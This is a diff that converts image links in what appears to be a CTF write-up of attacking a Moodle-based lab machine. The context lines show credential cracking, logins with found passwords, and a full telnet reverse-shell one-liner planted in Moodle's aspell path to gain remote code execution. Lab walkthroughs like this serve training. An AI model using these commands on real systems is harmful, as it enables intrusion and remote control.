@@ -833,7 +833,7 @@ quit
 # GNO system
 ## GNO Web service reconn
 
-![[Pasted image 20210508135232.png]]
+![](Pasted%20image%2020210508135232.png)
 
 - This system is from moodle, so I searchsploit of it.
 ```bash
@@ -874,7 +874,7 @@ Shellcodes: No Results
 - There's lots of it, need to confirm the version.
 - After login to GNO system, there's a message from message box.
 
-![[Pasted image 20210508135546.png]]
+![](Pasted%20image%2020210508135546.png)
 
 - Now there comes with another user: Dr Doak., his email username is `doak`, so we should crack his password, and get more mails.
 ```bash
@@ -931,26 +931,26 @@ quit
 
 - When clicking Tags, we got another two users: admin and boris
 
-![[Pasted image 20210508135906.png]]
+![](Pasted%20image%2020210508135906.png)
 
-![[Pasted image 20210508135944.png]]
+![](Pasted%20image%2020210508135944.png)
 
 - Xenia user profile
 
-![[Pasted image 20210508140035.png]]
+![](Pasted%20image%2020210508140035.png)
 
 - A file uploader
 
-![[Pasted image 20210508140129.png]]
+![](Pasted%20image%2020210508140129.png)
 
 - Tried to upload a fake png file, it's ok with the upload function, but can't find the valid path to access it. It will always lead to a file download.
 
 - So nothing we've got from xenia anyway, let's try username `dr_doak` with password `4England!`.
 - After login, the very first thing catch our eyes is a secret file.
 
-![[Pasted image 20210508165306.png]]
+![](Pasted%20image%2020210508165306.png)
 
-![[Pasted image 20210508165355.png]]
+![](Pasted%20image%2020210508165355.png)
 
 ```bash
 007,
@@ -964,7 +964,7 @@ Something juicy is located here: /dir007key/for-007.jpg
 Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.
 ```
 
-![[Pasted image 20210508165616.png]]
+![](Pasted%20image%2020210508165616.png)
 
 - We shall download and exam it.
 ```bash
@@ -1009,37 +1009,37 @@ xWinter1995x!
 
 - So this is GNO system's admin credential! We shall log back in as admin now.
 
-![[Pasted image 20210508165944.png]]
+![](Pasted%20image%2020210508165944.png)
 
-![[Pasted image 20210508170021.png]]
+![](Pasted%20image%2020210508170021.png)
 
 - Boris, sir? Are you sure about that?
 
-![[Pasted image 20210508170156.png]]
+![](Pasted%20image%2020210508170156.png)
 
 - Is this so obvious? A telnet command?
 
-![[Pasted image 20210508174103.png]]
+![](Pasted%20image%2020210508174103.png)
 
 `sh -c '(sleep 4062|telnet 192.168.230.132 4444|while : ; do sh && break; done 2>&1|telnet 192.168.230.132 4444 >/dev/null 2>&1 &)'`
 
 - Alright, here's it. Have to tell the system to use aspell or pspellshell.
 
-![[Pasted image 20210508175040.png]]
+![](Pasted%20image%2020210508175040.png)
 
 - I tried on aspell, but not work, then I found a metasploit exploit, ###### 29324
 https://www.exploit-db.com/exploits/29324
 - By checking the ruby code, I figured it out, first go to Server -> System Path to put reverse shell command into aspell text box:
 
-![[Pasted image 20210508181721.png]]
+![](Pasted%20image%2020210508181721.png)
 
 - Then go change the TinyMCE editor setting from Plugins -> Text Editors -> TinyMCE HTML Editor, Spell Engine to pspellshell.
 
-![[Pasted image 20210508181828.png]]
+![](Pasted%20image%2020210508181828.png)
 
 - Setup a listener, and then go to new blog entry and click the spellcheck button, that's it.
 
-![[Pasted image 20210508181921.png]]
+![](Pasted%20image%2020210508181921.png)
 
 ```bash
 └╼cn$ bash
